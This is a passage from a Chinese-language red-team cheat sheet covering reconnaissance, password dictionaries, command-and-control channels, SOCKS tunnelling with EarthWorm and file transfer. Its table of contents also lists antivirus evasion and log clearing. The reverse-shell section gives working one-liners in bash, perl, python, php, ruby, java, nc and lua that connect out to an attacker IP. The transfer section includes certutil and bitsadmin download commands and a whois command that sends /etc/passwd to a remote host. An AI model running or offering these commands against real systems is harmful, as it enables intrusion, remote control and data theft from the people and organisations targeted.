<li><a href="#sid-history">SID History</a></li>
<li><a href="#adminsdholdersdprop-">AdminSDHolder＆SDProp</a></li>
<li><a href="#%E7%BB%84%E7%AD%96%E7%95%A5">组策略</a></li>
<li><a href="#hook-passwordchangenotify">Hook PasswordChangeNotify</a></li>
</ul>
</li>
<li><a href="#tips">TIPS</a></li>
<li><a href="#%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7">相关工具</a></li>
</ul>
</li>
<li><a href="#%E5%9C%A8%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E4%B8%8A%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F">在远程系统上执行程序</a></li>
<li><a href="#iot%E7%9B%B8%E5%85%B3">IOT相关</a></li>
<li><a href="#%E4%B8%AD%E9%97%B4%E4%BA%BA">中间人</a></li>
<li><a href="#%E8%A7%84%E9%81%BF%E6%9D%80%E8%BD%AF%E5%8F%8A%E6%A3%80%E6%B5%8B">规避杀软及检测</a><ul>
<li><a href="#bypass-applocker">Bypass Applocker</a></li>
<li><a href="#bypassav">bypassAV</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86">痕迹清理</a><ul>
<li><a href="#windows%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4">Windows日志清除</a></li>
<li><a href="#%E7%A0%B4%E5%9D%8Fwindows%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E5%8A%9F%E8%83%BD">破坏Windows日志记录功能</a></li>
<li><a href="#msf">msf</a></li>
<li><a href="#3389%E7%99%BB%E9%99%86%E8%AE%B0%E5%BD%95%E6%B8%85%E9%99%A4">3389登陆记录清除</a></li>
</ul>
</li>
</ul>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="开源情报信息收集（OSINT）"><a href="#开源情报信息收集（OSINT）" class="headerlink" title="开源情报信息收集（OSINT）"></a>开源情报信息收集（OSINT）</h3><h4 id="github"><a href="#github" class="headerlink" title="github"></a>github</h4><ul>
<li>Github_Nuggests（自动爬取Github上文件敏感信息泄露） :<a href="https://github.com/az0ne/Github_Nuggests" target="_blank" rel="noopener">https://github.com/az0ne/Github_Nuggests</a></li>
<li>GSIL（能够实现近实时（15分钟内）的发现Github上泄露的信息） :<a href="https://github.com/FeeiCN/GSIL" target="_blank" rel="noopener">https://github.com/FeeiCN/GSIL</a></li>
<li>x-patrol(小米团队的):<a href="https://github.com/MiSecurity/x-patrol" target="_blank" rel="noopener">https://github.com/MiSecurity/x-patrol</a></li>
</ul>
<h4 id="whois查询-注册人反查-邮箱反查-相关资产"><a href="#whois查询-注册人反查-邮箱反查-相关资产" class="headerlink" title="whois查询/注册人反查/邮箱反查/相关资产"></a>whois查询/注册人反查/邮箱反查/相关资产</h4><ul>
<li>站长之家:<a href="http://whois.chinaz.com/?DomainName=target.com&amp;ws=" target="_blank" rel="noopener">http://whois.chinaz.com/?DomainName=target.com&amp;ws=</a></li>
<li>爱站:<a href="https://whois.aizhan.com/target.com/" target="_blank" rel="noopener">https://whois.aizhan.com/target.com/</a></li>
<li>微步在线:<a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a></li>
<li>IP反查:<a href="https://dns.aizhan.com/" target="_blank" rel="noopener">https://dns.aizhan.com/</a></li>
<li>天眼查:<a href="https://www.tianyancha.com/" target="_blank" rel="noopener">https://www.tianyancha.com/</a></li>
<li>虎妈查:<a href="http://www.whomx.com/" target="_blank" rel="noopener">http://www.whomx.com/</a></li>
<li>历史漏洞查询 :<ul>
<li>在线查询:<a href="http://wy.zone.ci/" target="_blank" rel="noopener">http://wy.zone.ci/</a></li>
<li>自搭建:<a href="https://github.com/hanc00l/wooyun_publi/" target="_blank" rel="noopener">https://github.com/hanc00l/wooyun_publi/</a></li>
</ul>
</li>
</ul>
<h4 id="google-hacking"><a href="#google-hacking" class="headerlink" title="google hacking"></a>google hacking</h4><h3 id="创建企业密码字典"><a href="#创建企业密码字典" class="headerlink" title="创建企业密码字典"></a>创建企业密码字典</h3><h4 id="字典列表"><a href="#字典列表" class="headerlink" title="字典列表"></a>字典列表</h4><ul>
<li>passwordlist:<a href="https://github.com/lavalamp-/password-lists" target="_blank" rel="noopener">https://github.com/lavalamp-/password-lists</a></li>
<li>猪猪侠字典:<a href="https://pan.baidu.com/s/1dFJyedz" target="_blank" rel="noopener">https://pan.baidu.com/s/1dFJyedz</a><br><a href="https://github.com/rootphantomer/Blasting_dictionary" target="_blank" rel="noopener">Blasting_dictionary</a>（分享和收集各种字典，包括弱口令，常用密码，目录爆破。数据库爆破，编辑器爆破，后台爆破等） </li>
<li>针对特定的厂商，重点构造厂商相关域名的字典<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&apos;%pwd%123&apos;,&apos;%user%123&apos;,&apos;%user%521&apos;,&apos;%user%2017&apos;,&apos;%pwd%321&apos;,&apos;%pwd%521&apos;,&apos;%user%321&apos;,&apos;%pwd%123!&apos;,&apos;%pwd%123!@#&apos;,&apos;%pwd%1234&apos;,&apos;%user%2016&apos;,&apos;%user%123$%^&apos;,&apos;%user%123!@#&apos;,&apos;%pwd%2016&apos;,&apos;%pwd%2017&apos;,&apos;%pwd%1!&apos;,&apos;%pwd%2@&apos;,&apos;%pwd%3#&apos;,&apos;%pwd%123#@!&apos;,&apos;%pwd%12345&apos;,&apos;%pwd%123$%^&apos;,&apos;%pwd%!@#456&apos;,&apos;%pwd%123qwe&apos;,&apos;%pwd%qwe123&apos;,&apos;%pwd%qwe&apos;,&apos;%pwd%123456&apos;,&apos;%user%123#@!&apos;,&apos;%user%!@#456&apos;,&apos;%user%1234&apos;,&apos;%user%12345&apos;,&apos;%user%123456&apos;,&apos;%user%123!&apos;]</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="密码生成"><a href="#密码生成" class="headerlink" title="密码生成"></a>密码生成</h4><ul>
<li>GenpAss（中国特色的弱口令生成器: <a href="https://github.com/RicterZ/genpAss/" target="_blank" rel="noopener">https://github.com/RicterZ/genpAss/</a></li>
<li>passmaker（可以自定义规则的密码字典生成器） ：<a href="https://github.com/bit4woo/passmaker" target="_blank" rel="noopener">https://github.com/bit4woo/passmaker</a></li>
<li>pydictor（强大的密码生成器） ：<a href="https://github.com/LandGrey/pydictor" target="_blank" rel="noopener">https://github.com/LandGrey/pydictor</a></li>
</ul>
<h4 id="邮箱列表获取"><a href="#邮箱列表获取" class="headerlink" title="邮箱列表获取"></a>邮箱列表获取</h4><ul>
<li>theHarvester ：<a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">https://github.com/laramies/theHarvester</a></li>
<li>获取一个邮箱以后导出通讯录 </li>
<li>LinkedInt :<a href="https://github.com/mdsecactivebreach/LinkedInt" target="_blank" rel="noopener">https://github.com/mdsecactivebreach/LinkedInt</a></li>
<li>Mailget：<a href="https://github.com/Ridter/Mailget" target="_blank" rel="noopener">https://github.com/Ridter/Mailget</a></li>
</ul>
<h4 id="泄露密码查询"><a href="#泄露密码查询" class="headerlink" title="泄露密码查询"></a>泄露密码查询</h4><ul>
<li>ghostproject: <a href="https://ghostproject.fr/" target="_blank" rel="noopener">https://ghostproject.fr/</a></li>
<li>pwndb: <a href="https://pwndb2am4tzkvold.onion.to/" target="_blank" rel="noopener">https://pwndb2am4tzkvold.onion.to/</a></li>
</ul>
<h4 id="对企业外部相关信息进行搜集"><a href="#对企业外部相关信息进行搜集" class="headerlink" title="对企业外部相关信息进行搜集"></a>对企业外部相关信息进行搜集</h4><h5 id="子域名获取"><a href="#子域名获取" class="headerlink" title="子域名获取"></a>子域名获取</h5><ul>
<li>Layer子域名挖掘机4.2纪念版 </li>
<li>subDomainsBrute ：<a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a></li>
<li>wydomain ：<a href="https://github.com/ring04h/wydomain" target="_blank" rel="noopener">https://github.com/ring04h/wydomain</a></li>
<li>Sublist3r ：<a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">https://github.com/aboul3la/Sublist3r</a></li>
<li>site:target.com:<a href="https://www.google.com" target="_blank" rel="noopener">https://www.google.com</a></li>
<li>Github代码仓库 </li>
<li>抓包分析请求返回值(跳转/文件上传/app/api接口等) </li>
<li>站长帮手links等在线查询网站 </li>
<li>域传送漏洞 </li>
</ul>
<p>Linux</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig @ns.example.com example=.com AXFR</span><br></pre></td></tr></table></figure>
<p>Windows</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nslookup -type=ns xxx.yyy.cn #查询解析某域名的DNS服务器</span><br><span class="line">nslookup #进入nslookup交互模式</span><br><span class="line">server dns.domian.com #指定dns服务器</span><br><span class="line">ls xxx.yyy.cn #列出域信息</span><br></pre></td></tr></table></figure>

<ul>
<li>GetDomainsBySSL.py :<a href="https://note.youdao.com/ynoteshare1/index.html?id=247d97fc1d98b122ef9804906356d47a&amp;type=note#/" target="_blank" rel="noopener">https://note.youdao.com/ynoteshare1/index.html?id=247d97fc1d98b122ef9804906356d47a&amp;type=note#/</a></li>
<li>censys.io证书 :<a href="https://censys.io/certificates?q=target.com" target="_blank" rel="noopener">https://censys.io/certificates?q=target.com</a></li>
<li>crt.sh证书查询:<a href="https://crt.sh/?q=%25.target.com" target="_blank" rel="noopener">https://crt.sh/?q=%25.target.com</a></li>
<li>shadon :<a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io/</a></li>
<li>zoomeye :<a href="https://www.zoomeye.org/" target="_blank" rel="noopener">https://www.zoomeye.org/</a></li>
<li>fofa :<a href="https://fofa.so/" target="_blank" rel="noopener">https://fofa.so/</a></li>
<li>censys：<a href="https://censys.io/" target="_blank" rel="noopener">https://censys.io/</a></li>
<li>dnsdb.io :<a href="https://dnsdb.io/zh-cn/search?q=target.com" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/search?q=target.com</a></li>
<li>api.hackertarget.com :<a href="http://api.hackertarget.com/reversedns/?q=target.com" target="_blank" rel="noopener">http://api.hackertarget.com/reversedns/?q=target.com</a></li>
<li>community.riskiq.com :<a href="https://community.riskiq.com/Search/target.com" target="_blank" rel="noopener">https://community.riskiq.com/Search/target.com</a></li>
<li>subdomain3 :<a href="https://github.com/yanxiu0614/subdomain3" target="_blank" rel="noopener">https://github.com/yanxiu0614/subdomain3</a></li>
<li>FuzzDomain :<a href="https://github.com/Chora10/FuzzDomain" target="_blank" rel="noopener">https://github.com/Chora10/FuzzDomain</a></li>
<li>dnsdumpster.com :<a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a></li>
<li>phpinfo.me :<a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></li>
<li>dns开放数据接口 :<a href="https://dns.bufferover.run/dns?q=baidu.com" target="_blank" rel="noopener">https://dns.bufferover.run/dns?q=baidu.com</a></li>
</ul>
<h2 id="进入内网"><a href="#进入内网" class="headerlink" title="进入内网"></a>进入内网</h2><h3 id="基于企业弱账号漏洞"><a href="#基于企业弱账号漏洞" class="headerlink" title="基于企业弱账号漏洞"></a>基于企业弱账号漏洞</h3><ul>
<li>VPN（通过邮箱，密码爆破，社工等途径获取VPN） </li>
<li>企业相关运维系统（zabbix等） </li>
</ul>
<h3 id="基于系统漏洞进入"><a href="#基于系统漏洞进入" class="headerlink" title="基于系统漏洞进入"></a>基于系统漏洞进入</h3><ul>
<li>Metasploit(漏洞利用框架):<a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework</a> </li>
<li>漏洞利用脚本 </li>
</ul>
<h3 id="网站应用程序渗透"><a href="#网站应用程序渗透" class="headerlink" title="网站应用程序渗透"></a>网站应用程序渗透</h3><ul>
<li>SQL注入 </li>
<li>跨站脚本（XSS） </li>
<li>跨站请求伪造（CSRF） </li>
<li>SSRF（<a href="https://github.com/bcoles/ssrf_proxy" target="_blank" rel="noopener">ssrf_proxy</a>） </li>
<li>功能/业务逻辑漏洞 </li>
<li>其他漏洞等 </li>
<li>CMS-内容管理系统漏洞 </li>
<li>企业自建代理 </li>
</ul>
<h3 id="无线Wi-Fi接入"><a href="#无线Wi-Fi接入" class="headerlink" title="无线Wi-Fi接入"></a>无线Wi-Fi接入</h3><h2 id="隐匿攻击"><a href="#隐匿攻击" class="headerlink" title="隐匿攻击"></a>隐匿攻击</h2><h3 id="Command-and-Control"><a href="#Command-and-Control" class="headerlink" title="Command and Control"></a>Command and Control</h3><ul>
<li>ICMP :<a href="https://pentestlab.blog/2017/07/28/command-and-control-icmp/" target="_blank" rel="noopener">https://pentestlab.blog/2017/07/28/command-and-control-icmp/</a></li>
<li>DNS :<a href="https://pentestlab.blog/2017/09/06/command-and-control-dns/" target="_blank" rel="noopener">https://pentestlab.blog/2017/09/06/command-and-control-dns/</a></li>
<li>DropBox :<a href="https://pentestlab.blog/2017/08/29/command-and-control-dropbox/" target="_blank" rel="noopener">https://pentestlab.blog/2017/08/29/command-and-control-dropbox/</a></li>
<li>Gmail :<a href="https://pentestlab.blog/2017/08/03/command-and-control-gmail/" target="_blank" rel="noopener">https://pentestlab.blog/2017/08/03/command-and-control-gmail/</a></li>
<li>Telegram :<a href="http://drops.xmd5.com/static/drops/tips-16142.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-16142.html</a></li>
<li>Twitter :<a href="https://pentestlab.blog/2017/09/26/command-and-control-twitter/" target="_blank" rel="noopener">https://pentestlab.blog/2017/09/26/command-and-control-twitter/</a></li>
<li>Website Keyword :<a href="https://pentestlab.blog/2017/09/14/command-and-control-website-keyword/" target="_blank" rel="noopener">https://pentestlab.blog/2017/09/14/command-and-control-website-keyword/</a></li>
<li>PowerShell :<a href="https://pentestlab.blog/2017/08/19/command-and-control-powershell/" target="_blank" rel="noopener">https://pentestlab.blog/2017/08/19/command-and-control-powershell/</a></li>
<li>Windows COM :<a href="https://pentestlab.blog/2017/09/01/command-and-control-windows-com/" target="_blank" rel="noopener">https://pentestlab.blog/2017/09/01/command-and-control-windows-com/</a></li>
<li>WebDAV :<a href="https://pentestlab.blog/2017/09/12/command-and-control-webdav/" target="_blank" rel="noopener">https://pentestlab.blog/2017/09/12/command-and-control-webdav/</a></li>
<li>Office 365 :<a href="https://www.anquanke.com/post/id/86974" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86974</a></li>
<li>HTTPS :<a href="https://pentestlab.blog/2017/10/04/command-and-control-https/" target="_blank" rel="noopener">https://pentestlab.blog/2017/10/04/command-and-control-https/</a></li>
<li>Kernel :<a href="https://pentestlab.blog/2017/10/02/command-and-control-kernel/" target="_blank" rel="noopener">https://pentestlab.blog/2017/10/02/command-and-control-kernel/</a></li>
<li>Website :<a href="https://pentestlab.blog/2017/11/14/command-and-control-website/" target="_blank" rel="noopener">https://pentestlab.blog/2017/11/14/command-and-control-website/</a></li>
<li>WMI :<a href="https://pentestlab.blog/2017/11/20/command-and-control-wmi/" target="_blank" rel="noopener">https://pentestlab.blog/2017/11/20/command-and-control-wmi/</a></li>
<li>WebSocket :<a href="https://pentestlab.blog/2017/12/06/command-and-control-websocket/" target="_blank" rel="noopener">https://pentestlab.blog/2017/12/06/command-and-control-websocket/</a></li>
<li>Images :<a href="https://pentestlab.blog/2018/01/02/command-and-control-images/" target="_blank" rel="noopener">https://pentestlab.blog/2018/01/02/command-and-control-images/</a></li>
<li>Web Interface :<a href="https://pentestlab.blog/2018/01/03/command-and-control-web-interface/" target="_blank" rel="noopener">https://pentestlab.blog/2018/01/03/command-and-control-web-interface/</a></li>
<li>JavaScript :<a href="https://pentestlab.blog/2018/01/08/command-and-control-javascript/" target="_blank" rel="noopener">https://pentestlab.blog/2018/01/08/command-and-control-javascript/</a></li>
<li>… </li>
</ul>
<h3 id="Fronting"><a href="#Fronting" class="headerlink" title="Fronting"></a>Fronting</h3><ul>
<li><a href="https://evi1cg.me/archives/Domain_Fronting.html" target="_blank" rel="noopener">Domain Fronting </a></li>
<li><a href="https://evi1cg.me/archives/Tor_Fronting.html" target="_blank" rel="noopener">Tor_Fronting.</a></li>
</ul>
<h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><ul>
<li>VPN </li>
<li>shadowsockts :<a href="https://github.com/shadowsocks" target="_blank" rel="noopener">https://github.com/shadowsocks</a></li>
<li>HTTP :<a href="http://cn-proxy.com/" target="_blank" rel="noopener">http://cn-proxy.com/</a></li>
<li>Tor </li>
</ul>
<h2 id="内网跨边界应用"><a href="#内网跨边界应用" class="headerlink" title="内网跨边界应用"></a>内网跨边界应用</h2><h3 id="内网跨边界转发"><a href="#内网跨边界转发" class="headerlink" title="内网跨边界转发"></a>内网跨边界转发</h3><ul>
<li><a href="https://blog.csdn.net/l_f0rm4t3d/article/details/24004555" target="_blank" rel="noopener">NC端口转发</a> </li>
<li><a href="http://blog.chinaunix.net/uid-53401-id-4407931.html" target="_blank" rel="noopener">LCX端口转发 </a></li>
<li><a href="https://github.com/cnlh/nps" target="_blank" rel="noopener">nps</a></li>
<li>代理脚本 <ol>
<li><a href="https://github.com/SECFORCE/Tunna" target="_blank" rel="noopener">Tunna </a></li>
<li><a href="https://github.com/sensepost/reDuh" target="_blank" rel="noopener">Reduh </a></li>
</ol>
</li>
<li>… </li>
</ul>
<h3 id="内网跨边界代理穿透"><a href="#内网跨边界代理穿透" class="headerlink" title="内网跨边界代理穿透"></a>内网跨边界代理穿透</h3><h4 id="EW"><a href="#EW" class="headerlink" title="EW"></a><a href="https://rootkiter.com/EarthWorm/" target="_blank" rel="noopener">EW</a></h4><p>正向 SOCKS v5 服务器:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./ew -s ssocksd -l 1080</span><br></pre></td></tr></table></figure>
<p> 反弹 SOCKS v5 服务器:<br>a) 先在一台具有公网 ip 的主机A上运行以下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ./ew -s rcsocks -l 1080 -e 8888</span><br></pre></td></tr></table></figure>
<p>b) 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ./ew -s rssocks -d 1.1.1.1 -e 8888</span><br></pre></td></tr></table></figure>
<p>多级级联</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ./ew -s lcx_listen -l 1080 -e 8888</span><br><span class="line">$ ./ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999</span><br><span class="line">$ ./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999</span><br></pre></td></tr></table></figure>
<p>lcx_tran 的用法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ./ew -s ssocksd -l 9999</span><br><span class="line">$ ./ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999</span><br></pre></td></tr></table></figure>
<p>lcx_listen、lcx_slave 的用法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ./ew -s lcx_listen -l 1080 -e 8888</span><br><span class="line">$ ./ew -s ssocksd -l 9999</span><br><span class="line">$ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999</span><br></pre></td></tr></table></figure>
<p>“三级级联”的本地SOCKS测试用例以供参考</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ./ew -s rcsocks -l 1080 -e 8888</span><br><span class="line">$ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999</span><br><span class="line">$ ./ew -s lcx_listen -l 9999 -e 7777</span><br><span class="line">$ ./ew -s rssocks -d 127.0.0.1 -e 7777</span><br></pre></td></tr></table></figure>
<h4 id="Termite"><a href="#Termite" class="headerlink" title="Termite"></a><a href="https://rootkiter.com/Termite/" target="_blank" rel="noopener">Termite</a></h4><p>使用说明:<a href="https://rootkiter.com/Termite/README.txt" target="_blank" rel="noopener">https://rootkiter.com/Termite/README.txt</a> </p>
<h4 id="代理脚本"><a href="#代理脚本" class="headerlink" title="代理脚本"></a>代理脚本</h4><p>reGeorg :<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">https://github.com/sensepost/reGeorg</a></p>
<h3 id="shell反弹"><a href="#shell反弹" class="headerlink" title="shell反弹"></a>shell反弹</h3><p>bash  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>perl </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure>
<p>python </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure>
<p>php </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -r &apos;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure>
<p>ruby </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</span><br></pre></td></tr></table></figure>
<p>java </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
<p>nc </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#使用-e </span><br><span class="line">nc -e /bin/sh 223.8.200.234 1234</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#不使用-e</span><br><span class="line">mknod /tmp/backpipe p</span><br><span class="line">/bin/sh 0/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipe</span><br></pre></td></tr></table></figure>

<p>lua </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;202.103.243.122&apos;,&apos;1234&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;</span><br></pre></td></tr></table></figure>

<h3 id="内网文件的传输和下载"><a href="#内网文件的传输和下载" class="headerlink" title="内网文件的传输和下载"></a>内网文件的传输和下载</h3><p>wput </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wput dir_name ftp://linuxpig:123456@host.com/</span><br></pre></td></tr></table></figure>
<p>wget </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http://site.com/1.rar -O 1.rar</span><br></pre></td></tr></table></figure>
<p>ariac2（需安装） </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aria2c -o owncloud.zip https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2</span><br></pre></td></tr></table></figure>
<p>powershell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$p = New-Object System.Net.WebClient </span><br><span class="line">$p.DownloadFile(&quot;http://domain/file&quot;,&quot;C:%homepath%file&quot;)</span><br></pre></td></tr></table></figure>
<p>vbs脚本 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set args = Wscript.Arguments</span><br><span class="line">Url = &quot;http://domain/file&quot;</span><br><span class="line">dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;)</span><br><span class="line">dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)</span><br><span class="line">xHttp.Open &quot;GET&quot;, Url, False</span><br><span class="line">xHttp.Send</span><br><span class="line">with bStrm</span><br><span class="line">.type = 1 &apos;</span><br><span class="line">.open</span><br><span class="line">.write xHttp.responseBody</span><br><span class="line">.savetofile &quot; C:\%homepath%\file&quot;, 2 &apos;</span><br><span class="line">end with</span><br></pre></td></tr></table></figure>
<blockquote>
<p>执行 ：cscript test.vbs</p>
</blockquote>
<p>Perl </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/perl </span><br><span class="line">use LWP::Simple; </span><br><span class="line">getstore(&quot;http://domain/file&quot;, &quot;file&quot;);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>执行：perl test.pl</p>
</blockquote>
<p>Python </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python </span><br><span class="line">import urllib2 </span><br><span class="line">u = urllib2.urlopen(&apos;http://domain/file&apos;) </span><br><span class="line">localFile = open(&apos;local_file&apos;, &apos;w&apos;) </span><br><span class="line">localFile.write(u.read()) </span><br><span class="line">localFile.close()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>执行：python test.py</p>
</blockquote>
<p>Ruby </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/ruby</span><br><span class="line">require &apos;net/http&apos;</span><br><span class="line">Net::HTTP.start(&quot;www.domain.com&quot;) &#123; |http|</span><br><span class="line">r = http.get(&quot;/file&quot;)</span><br><span class="line">open(&quot;save_location&quot;, &quot;wb&quot;) &#123; |file|</span><br><span class="line">file.write(r.body)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>执行：ruby test.rb</p>
</blockquote>
<p>PHP </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url  = &apos;http://www.example.com/file&apos;;</span><br><span class="line">$path = &apos;/path/to/file&apos;;</span><br><span class="line">$ch = curl_init($url);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</span><br><span class="line">$data = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">file_put_contents($path, $data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>执行：php test.php</p>
</blockquote>
<p>NC<br>attacker </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat file | nc -l 1234</span><br></pre></td></tr></table></figure>
<p>target</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc host_ip 1234 &gt; file</span><br></pre></td></tr></table></figure>
<p>FTP</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ftp 127.0.0.1 username password get file exit</span><br></pre></td></tr></table></figure>
<p>TFTP </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tftp -i host GET C:%homepath%file location_of_file_on_tftp_server</span><br></pre></td></tr></table></figure>
<p>Bitsadmin </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin /transfer n http://domain/file c:%homepath%file</span><br></pre></td></tr></table></figure>
<p>Window 文件共享 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use x: \127.0.0.1\share /user:example.comuserID myPassword</span><br></pre></td></tr></table></figure>
<p>SCP<br>本地到远程 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scp file user@host.com:/tmp</span><br></pre></td></tr></table></figure>
<p>远程到本地 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scp user@host.com:/tmp file</span><br></pre></td></tr></table></figure>
<p>rsync<br>远程rsync服务器中拷贝文件到本地机 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rsync -av root@192.168.78.192::www /databack</span><br></pre></td></tr></table></figure>
<p>本地机器拷贝文件到远程rsync服务器 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rsync -av /databack root@192.168.78.192::www</span><br></pre></td></tr></table></figure>
<p>certutil.exe </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://site.com/file</span><br></pre></td></tr></table></figure>
<p>copy</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy \\IP\ShareName\file.exe file.exe</span><br></pre></td></tr></table></figure>
<p>WHOIS<br>接收端 Host B：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -vlnp 1337 | sed &quot;s/ //g&quot; | base64 -d</span><br></pre></td></tr></table></figure>
<p>发送端 Host A：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whois -h host_ip -p 1337 `cat /etc/passwd | base64`</span><br></pre></td></tr></table></figure>

